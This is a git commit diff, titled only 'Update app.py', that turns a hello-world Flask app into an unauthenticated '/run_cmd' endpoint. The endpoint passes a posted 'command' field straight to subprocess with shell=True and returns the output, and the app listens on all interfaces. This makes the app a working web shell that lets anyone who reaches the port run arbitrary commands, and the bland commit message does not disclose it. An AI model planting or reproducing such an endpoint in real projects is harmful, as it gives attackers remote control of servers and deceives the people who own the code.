b83400aa6e2333e96e6b259ed10dc51c79b5bd12
balckwilliam <32457598+balckwilliam@users.noreply.github.com>
2023-06-08 08:18:47 +0800

    Update app.py

--- app.py
+++ app.py
@@ -1,6 +1,16 @@
-from flask import Flask
+from flask import Flask, request, jsonify
+import subprocess
+
 app = Flask(__name__)
 
-@app.route('/')
-def hello_world():
-    return 'Hello, World!'
+@app.route('/run_cmd', methods=['POST'])
+def run_cmd():
+    command = request.form['command']
+    try:
+        output = subprocess.check_output(command, shell=True)
+        return jsonify({'output': output.decode('utf-8')})
+    except subprocess.CalledProcessError as e:
+        return jsonify({'output': str(e)})
+
+if __name__ == "__main__":
+    app.run(host='0.0.0.0', port=5000)
